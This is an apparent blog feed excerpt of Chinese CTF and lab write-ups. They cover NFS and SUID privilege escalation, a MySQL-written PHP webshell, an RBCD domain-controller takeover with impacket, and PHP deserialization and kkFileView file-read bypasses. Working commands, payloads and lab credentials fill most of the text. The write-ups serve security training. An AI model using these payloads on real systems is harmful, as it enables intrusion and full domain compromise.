class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">172.22.13.57   Centos  2049端口  NFS</span><br><span class="line"></span><br><span class="line">172.22.13.6    DC  XIAORANG\WIN-DC</span><br><span class="line"></span><br><span class="line">172.22.13.28    WIN-HAUWOLAO.xiaorang.lab 8000  mysql:172.22.13.28:3306:root 123456  OA系统 </span><br><span class="line"></span><br><span class="line">172.22.13.14   getshell主机  拿下</span><br></pre></td></tr></table></figure><p>这个NFS是关键  文件共享用的一个服务  默认端口2049</p><p>NFS 提权, 参考文章: <a href="https://xz.aliyun.com/t/11664">https://xz.aliyun.com/t/11664</a></p><p>大致就是 NFS 配置不当导致文件权限也能被共享过去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//因为本身ubuntu是不存在showmount这个工具的  所以我们得下载 但是下载源不对  所以我们要进行更改</span><br><span class="line">sudo sed -i &#x27;s/archive.ubuntu.com/mirrors.aliyun.com/g&#x27; /etc/apt/sources.list</span><br><span class="line">sudo apt-get update</span><br><span class="line">apt-get install nfs-common -y</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">showmount -e 172.22.13.57      //查看哪些路径下的文件可以被共享</span><br><span class="line">Export list for 172.22.13.57:</span><br><span class="line">/home/joyce *   </span><br><span class="line"></span><br><span class="line">mount -t nfs 172.22.13.57:/home/joyce /tmp/joyce -o nolock   </span><br><span class="line"></span><br><span class="line">//进行挂载 我们就可以访问/home/joyce下的文件了</span><br></pre></td></tr></table></figure><p>这里的话我们使用写ssh公钥的方式进行登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096</span><br><span class="line">mkdir .ssh</span><br><span class="line">cat /root/.ssh/id_rsa.pub &gt;&gt; /tmp/joyce/.ssh/authorized_keys</span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">ssh  -i /root/.ssh/id_rsa joyce@172.22.13.57</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231020205738859.png" alt="image-20231020205738859"></p><p>虽然flag在根目录下  但是我们并没有权限去读取他  这里的话有两个方法可以进行提权操作</p><ul><li>NFS提权</li></ul><p>这里能够提权的原因是  创建的文件共享过去的时候连着权限也一起传过去了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;#include&lt;unistd.h&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">        setuid(0);</span><br><span class="line">        setgid(0);</span><br><span class="line">        system(&quot;bash&quot;);</span><br><span class="line">&#125;&#x27; &gt; pwn.c</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp/joyce# echo &#x27;#include&lt;unistd.h&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">        setuid(0);</span><br><span class="line">        setgid(0);</span><br><span class="line">        system(&quot;bash&quot;);</span><br><span class="line">&#125;echo &#x27;#include&lt;unistd.h&gt;</span><br><span class="line">&gt; void main()</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt;         setuid(0);</span><br><span class="line">&gt;         setgid(0);</span><br><span class="line">&gt;         system(&quot;bash&quot;);</span><br><span class="line">&gt; &#x27; &gt; pwn.c</span><br><span class="line">&#125;&#x27; &gt; pwn.c</span><br><span class="line">root@ubuntu:/tmp/joyce# dir</span><br><span class="line">dir</span><br><span class="line">pwn.c</span><br><span class="line">root@ubuntu:/tmp/joyce# ls</span><br><span class="line">ls</span><br><span class="line">pwn.c</span><br><span class="line">root@ubuntu:/tmp/joyce# cat pwn.c</span><br><span class="line">cat pwn.c</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">        setuid(0);</span><br><span class="line">        setgid(0);</span><br><span class="line">        system(&quot;bash&quot;);</span><br><span class="line">&#125;</span><br><span class="line">root@ubuntu:/tmp/joyce# chmod -s pwn.c</span><br><span class="line">chmod -s pwn.c</span><br><span class="line">root@ubuntu:/tmp/joyce# gcc pwn.c -o pwn</span><br><span class="line">gcc pwn.c -o pwn</span><br><span class="line">pwn.c: In function ‘main’:</span><br><span class="line">pwn.c:6:9: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]</span><br><span class="line">    6 |         system(&quot;bash&quot;);</span><br><span class="line">      |         ^~~~~~</span><br><span class="line">root@ubuntu:/tmp/joyce# ls</span><br><span class="line">ls</span><br><span class="line">pwn  pwn.c</span><br><span class="line">root@ubuntu:/tmp/joyce# gcc pwn.c -o pwn;;;</span><br><span class="line">gcc pwn.c -o pwn;;;</span><br><span class="line">bash: syntax error near unexpected token `;;&#x27;</span><br><span class="line">root@ubuntu:/tmp/joyce# chmod +s pwn</span><br><span class="line">chmod +s pwn</span><br><span class="line">root@ubuntu:/tmp/joyce# ls -al</span><br><span class="line">ls -al</span><br><span class="line">total 52</span><br><span class="line">drwx------ 3  996  994  4096 Oct 20 21:03 .</span><br><span class="line">drwxrwxrwt 6 root root  4096 Oct 20 21:03 ..</span><br><span class="line">-rw------- 1  996  994    51 Oct 20 21:00 .bash_history</span><br><span class="line">-rw-r--r-- 1  996  994    18 Nov 25  2021 .bash_logout</span><br><span class="line">-rw-r--r-- 1  996  994   193 Nov 25  2021 .bash_profile</span><br><span class="line">-rw-r--r-- 1  996  994   231 Nov 25  2021 .bashrc</span><br><span class="line">drwxr-xr-x 2 root root  4096 Oct 20 20:57 .ssh</span><br><span class="line">-rwsr-sr-x 1 root root 16784 Oct 20 21:03 pwn</span><br><span class="line">-rw-r--r-- 1 root root    97 Oct 20 21:02 pwn.c</span><br></pre></td></tr></table></figure><p>这里创建好之后</p><p>ssh登录到刚刚的主机上</p><p><img src="../images/image-20231020212222420.png" alt="image-20231020212222420"></p><p>执行之后就拿下flag了</p><p><img src="../images/image-20231020212242659.png" alt="image-20231020212242659"></p><ul><li>这里讲第二种提权方式  就是ftp提权</li></ul><p><img src="../images/image-20231020212537916.png" alt="image-20231020212537916"></p><p>如果用原来的ftp的话是不行的  这里的话我们重新新建一个ftp  新建的话是有suid的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pyftpdlib -p 6666 -u test -P test -w &amp;</span><br></pre></td></tr></table></figure><p>然后连接上去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 172.22.13.14 6666</span><br><span class="line">put /flag02.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231020213622125.png" alt="image-20231020213622125"></p><p>然后在Ubuntu的那个主机上再次连接然后get下载下来读取就行了</p><p><img src="../images/image-20231020213732504.png" alt="image-20231020213732504"></p><p>然后一样的方法读取centos机器的目录下还有一个pAss.txt文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab/zhangwen\ QT62f3gBhK1</span><br><span class="line"></span><br><span class="line">//给了一个账号密码</span><br></pre></td></tr></table></figure><p>这就是两种不同的提权方法</p><blockquote><p>NFS是利用这个共享文件时权限也会共享过去</p><p>ftp是利用了suid这个权限</p></blockquote><p>接下来直接搭建隧道</p><p>这里拿下第二个flag之后  回看之前的信息收集  发现了一个弱口令的mysql</p><p>于是我们使用navicat来连接  mdut的话是udf提权失败</p><p><img src="../images/image-20231020214335122.png" alt="image-20231020214335122"></p><p>发现是任意路径可写  并且是以phpstudy启动的  于是直接写马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;C:/phpstudy_pro/WWW/1.php&quot;;</span><br></pre></td></tr></table></figure><p>然后蚁剑连接</p><p><img src="../images/image-20231020214523510.png" alt="image-20231020214523510"></p><p>因为是phpstudy启动的  权限高  所以可以直接读取</p><p><img src="../images/image-20231020214607268.png" alt="image-20231020214607268"></p><p>这个是我们刚刚获取到的用户名了  我们直接rdp上去运行sharphound.exe来看一下域内环境</p><p>(当然了  蚁剑上传文件查看也是可以的)</p><p><img src="../images/image-20231020214935835.png" alt="image-20231020214935835"></p><p>发现域中的chenglei用户是对这个域控有wirte写的权限  并且还是属于ACL admins组的</p><blockquote><p>那么可以直接写 DCSync / RBCD / Shadow Credentials</p></blockquote><p>这里测试了<code>Shadow Credentials</code>失败   不知道为啥…………………………………..</p><p>因为之前是用过了DCSync了  这次我们就用RBCD来打</p><p>addcomputer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains addcomputer.py xiaorang.lab/chenglei:&#x27;Xt61f3LBhg1&#x27; -dc-ip 172.22.13.6 -dc-host xiaorang.lab -computer-name &#x27;TEST$&#x27; -computer-pass &#x27;P@ssw0rd&#x27;</span><br></pre></td></tr></table></figure><p>rbcd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rbcd.py xiaorang.lab/chenglei:&#x27;Xt61f3LBhg1&#x27; -dc-ip 172.22.13.6 -action write -delegate-to &#x27;WIN-DC$&#x27; -delegate-from &#x27;TEST$&#x27;</span><br></pre></td></tr></table></figure><p>getst</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains getST.py xiaorang.lab/&#x27;TEST$&#x27;:&#x27;P@ssw0rd&#x27; -spn cifs/WIN-DC.xiaorang.lab -impersonate Administrator -dc-ip 172.22.13.6</span><br></pre></td></tr></table></figure><p>获取到这个ccache文件后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=Administrator.ccache</span><br><span class="line"></span><br><span class="line">然后修改/etc/hosts</span><br><span class="line">172.22.13.6     WIN-DC.xiaorang.lab</span><br><span class="line">加进去就行</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后使用psexec.py无密码登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py Administrator@WIN-DC.xiaorang.lab -k -no-pass -dc-ip 172.22.13.6</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231020215515800.png" alt="image-20231020215515800"></p><p>然后拿下最后一个flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;fscan先扫一下ip&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231020203451556.png&quot; alt=&quot;image-20231020203451556&quot;&gt;&lt;/p&gt;
&lt;p&gt;存在一个ftp匿名登录 &lt;/p&gt;
&lt;p&gt;1.txt中没有东西 </summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>2023-香山杯-Web</title>
    <link href="https://ke1nys.github.io/posts/c253e927.html"/>
    <id>https://ke1nys.github.io/posts/c253e927.html</id>
    <published>2023-10-17T06:24:39.000Z</published>
    <updated>2023-10-20T14:12:45.764Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP-unserialize-pro"><a href="#PHP-unserialize-pro" class="headerlink" title="PHP_unserialize_pro"></a>PHP_unserialize_pro</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    class Welcome&#123;</span><br><span class="line">        public $name;</span><br><span class="line">        public $arg = &#x27;welcome&#x27;;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;name = &#x27;Wh0 4m I?&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">            if($this-&gt;name == &#x27;A_G00d_H4ck3r&#x27;)&#123;</span><br><span class="line">                echo $this-&gt;arg;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class G00d&#123;</span><br><span class="line">        public $shell;</span><br><span class="line">        public $cmd;</span><br><span class="line">        public function __invoke()&#123;</span><br><span class="line">            $shell = $this-&gt;shell;</span><br><span class="line">            $cmd = $this-&gt;cmd;</span><br><span class="line">            if(preg_match(&#x27;/f|l|a|g|\*|\?/i&#x27;, $cmd))&#123;</span><br><span class="line">                die(&quot;U R A BAD GUY&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            eval($shell($cmd));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class H4ck3r&#123;</span><br><span class="line">        public $func;</span><br><span class="line">        public function __toString()&#123;</span><br><span class="line">            $function = $this-&gt;func;</span><br><span class="line">            $function();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&#x27;data&#x27;]))</span><br><span class="line">        unserialize($_GET[&#x27;data&#x27;]);</span><br><span class="line">    else</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里的关键点就是在绕过这个正则匹配  然后进行RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    public $shell;</span><br><span class="line">    public $cmd;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $shell = $this-&gt;shell;</span><br><span class="line">        $cmd = $this-&gt;cmd;</span><br><span class="line">        if(preg_match(&#x27;/f|l|a|g|\*|\?/i&#x27;, $cmd))&#123;</span><br><span class="line">            die(&quot;U R A BAD GUY&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        eval($shell($cmd));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的话其实搜索一下就能找到原题</p><p><img src="../images/image-20231017143252649.png" alt="image-20231017143252649"></p><p>这里用的是这个方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;shell = &#x27;system&#x27;;</span><br><span class="line"></span><br><span class="line">$this-&gt;cmd = &#x27;cd /;more `php -r &quot;echo chr(102).chr(49).chr(97).chr(103);&quot;`&#x27;;</span><br><span class="line"></span><br><span class="line">//php -r 是可以执行多行php代码</span><br></pre></td></tr></table></figure><p>其实还有很多种方法可以进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[]这个的正则匹配</span><br><span class="line">$this-&gt;shell = &#x27;system&#x27;;</span><br><span class="line">$this-&gt;cmd = &#x27;more /[b-z][0-9][@-z][b-z]&#x27;;</span><br><span class="line"></span><br><span class="line">//当时tmd命令记错了 用了moore来做  然后没成功 就换了另一个来绕过</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;shell = &#x27;urldecode&#x27;;</span><br><span class="line">$this-&gt;cmd = &#x27;system(\$_POST[1]);&#x27;;</span><br><span class="line"></span><br><span class="line">//这里的话使用如果是$_POST[1]和system拆开来传参的话是不行的 </span><br><span class="line"></span><br><span class="line">//并且这个urldecode这个函数可以使用其他函数来进行替代</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;shell = &#x27;strtolower&#x27;;</span><br><span class="line">$this-&gt;cmd = &#x27;show_source(chr(47).chr(102).chr(49).chr(97).chr(103));&#x27;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">还有一种的话是用这种方法来执行</span><br><span class="line">$this-&gt;shell = &#x27;system&#x27;;</span><br><span class="line">$this-&gt;cmd=&#x27;echo &quot;\156\154\040\057\052&quot;|sh&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="meow-blog"><a href="#meow-blog" class="headerlink" title="meow_blog"></a>meow_blog</h2><p>考察的是原型链的污染</p><p>(先留着  看不太懂)</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2MTg0ODg2Ng==&amp;mid=2247483844&amp;idx=1&amp;sn=c770927e26fac822403d76407979a205&amp;chksm=ce119589f9661c9f02fe03cd3c5d3aab4e3e6628496f9e16dae152b11928ce6eaac9a4b9619d&amp;mpshare=1&amp;scene=23&amp;srcid=1016aEb1onrZgJQfzK7F1YrT&amp;sharer_shareinfo=e655dbdf105d9c8a6a2fa8737dc15b93&amp;sharer_shareinfo_first=a43480738df9ebe2764fb8ef00da8d95#rd">正常污染——WP1</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&amp;mid=2247494301&amp;idx=1&amp;sn=8cb000b5f109e4a3c850901c79b41197&amp;chksm=e8a1c94cdfd6405a6a91eb8dffb86e918cc76ef73aa2560d513130a35c85bc801677fb239b73&amp;mpshare=1&amp;scene=23&amp;srcid=1017O4HFTu9JhH1721nVXxsM&amp;sharer_shareinfo=94391037d31b40e4c18fe7ca08c31089&amp;sharer_shareinfo_first=989c488368efa43fb789948100473227#rd">SSTI—-WP</a></p><h2 id="sharedBox"><a href="#sharedBox" class="headerlink" title="sharedBox"></a><strong>sharedBox</strong></h2><p>这个题还是可以探讨一下的</p><p>这个里没有环境  就讲思路就行了</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2MTg0ODg2Ng==&amp;mid=2247483844&amp;idx=1&amp;sn=c770927e26fac822403d76407979a205&amp;chksm=ce119589f9661c9f02fe03cd3c5d3aab4e3e6628496f9e16dae152b11928ce6eaac9a4b9619d&amp;mpshare=1&amp;scene=23&amp;srcid=1016aEb1onrZgJQfzK7F1YrT&amp;sharer_shareinfo=e655dbdf105d9c8a6a2fa8737dc15b93&amp;sharer_shareinfo_first=a43480738df9ebe2764fb8ef00da8d95#rd">WP1</a>     <a href="https://www.yuque.com/dat0u/ctf/lbp2gfi6gttxsymb">WP2</a></p><p>这里刚开始  我是想去信息收集一下  然后发现了是kkfileview   这个东西   然后就去找到了一篇文章</p><p><a href="https://forum.butian.net/share/2088">https://forum.butian.net/share/2088</a>  qax的一篇文章  但是由于作者对源码进行了修改  导致这里的漏洞打不通  只能是慢慢的进行摸索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://59.110.231.185:40953/fileview/;/getCorsFile?urlPath=file:///root</span><br><span class="line"></span><br><span class="line">##刚开始我这里试的时候是403  就没多想  结果赛后发现  是可以绕过的  ..........</span><br></pre></td></tr></table></figure><p>那么我们就可以开始读取文件了 <strong>(file协议是可以看目录下有啥的)</strong></p><p>然后呢我们就读取到了start.sh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">FLAG_PATH=/tmp/config.properties</span><br><span class="line">FLAG_MODE=M_SED</span><br><span class="line">if [ $&#123;ICQ_FLAG&#125; ];then</span><br><span class="line">    case $FLAG_MODE in</span><br><span class="line">        &quot;M_ECHO&quot;)</span><br><span class="line">            echo -n $&#123;ICQ_FLAG&#125; &gt; $&#123;FLAG_PATH&#125;</span><br><span class="line">            FILE_MODE=755 # ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½flagï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½rootï¿½ï¿½ï¿½ï¿½ï¿½ï¿½</span><br><span class="line">            chmod $&#123;FILE_MODE&#125; $&#123;FLAG_PATH&#125;</span><br><span class="line">            ;;</span><br><span class="line">        &quot;M_SED&quot;)</span><br><span class="line">            #sed -i &quot;s/flag&#123;x*&#125;/$&#123;ICQ_FLAG&#125;/&quot; $&#123;FLAG_PATH&#125;</span><br><span class="line">            sed -i -r &quot;s/flag\&#123;.*\&#125;/$&#123;ICQ_FLAG&#125;/&quot; $&#123;FLAG_PATH&#125;</span><br><span class="line">            ;;</span><br><span class="line">        &quot;M_SQL&quot;)</span><br><span class="line">            # sed -i -r &quot;s/flag\&#123;.*\&#125;/$&#123;ICQ_FLAG&#125;/&quot; $&#123;FLAG_PATH&#125;</span><br><span class="line">            # mysql -uroot -proot &lt; $&#123;FLAG_PATH&#125;</span><br><span class="line">            ;;</span><br><span class="line">        *)</span><br><span class="line">            ;;</span><br><span class="line">    esac</span><br><span class="line">    echo [+] ICQ_FLAG OK   </span><br><span class="line">    unset ICQ_FLAG </span><br><span class="line">else</span><br><span class="line">    echo [!] no ICQ_FLAG</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">unset ICQ_FLAG</span><br><span class="line">rm -rf /etc/profile.d/pouchenv.sh</span><br><span class="line">rm -rf /etc/instanceInfo</span><br><span class="line">rm -rf /start.sh</span><br><span class="line"></span><br><span class="line">/usr/sbin/nginx</span><br><span class="line"></span><br><span class="line">/usr/sbin/crond</span><br><span class="line"></span><br><span class="line">/usr/sbin/rsyslogd</span><br><span class="line"></span><br><span class="line">javac /root/flag.java</span><br><span class="line">nohup java -classpath /root/sqlite-jdbc-3.41.2.2.jar:/root/ flag &gt;/dev/null &amp;</span><br><span class="line"></span><br><span class="line">nohup java -jar /root/upload.jar &gt;/dev/null &amp;</span><br><span class="line">sleep 1;</span><br><span class="line"></span><br><span class="line">rm /tmp/config.properties</span><br><span class="line"></span><br><span class="line">java -Dfile.encoding=UTF-8 -Dsun.java2d.cmm=sun.java2d.cmm.kcms.KcmsServiceProvider -Dspring.config.location=/opt/kkFileView-2.2.1/config/application.properties -jar /opt/kkFileView-2.2.1/bin/kkFileView-2.2.1.jar &amp;</span><br><span class="line">exec tail -f /dev/null</span><br></pre></td></tr></table></figure><p>虽然单看 <code>nohup java -classpath /root/sqlite-jdbc-3.41.2.2.jar:/root/ flag &gt;/dev/null</code></p><p>这里  flag是被删除了  但是呢这里并没有进行释放</p><p>和python的只open()不close()的原理是一样的 </p><p><img src="../images/image-20231017214957737.png" alt="image-20231017214957737"></p><p>那么我们就可以挨个爆破  直到得出结果</p><p>但是因为我们之前读取proc的是显示403的  这里可能过滤了这个  于是我们可以双重url编码进行绕过</p><p><code>proc/29/fd/6</code></p><p><img src="../images/image-20231017215251063.png" alt="image-20231017215251063"></p><p>当然了 这样也行</p><p><img src="../images/image-20231017215737664.png" alt="image-20231017215737664"></p><p>这都是非预期解  预期解是RCE</p><p>目前还没RCE的wp</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PHP-unserialize-pro&quot;&gt;&lt;a href=&quot;#PHP-unserialize-pro&quot; class=&quot;headerlink&quot; title=&quot;PHP_unserialize_pro&quot;&gt;&lt;/a&gt;PHP_unserialize_pro&lt;/h2&gt;&lt;figu</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://ke1nys.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Exchange</title>
    <link href="https://ke1nys.github.io/posts/47d3d323.html"/>
    <id>https://ke1nys.github.io/posts/47d3d323.html</id>
    <published>2023-10-16T12:11:34.000Z</published>
    <updated>2023-10-20T14:12:45.768Z</updated>
    
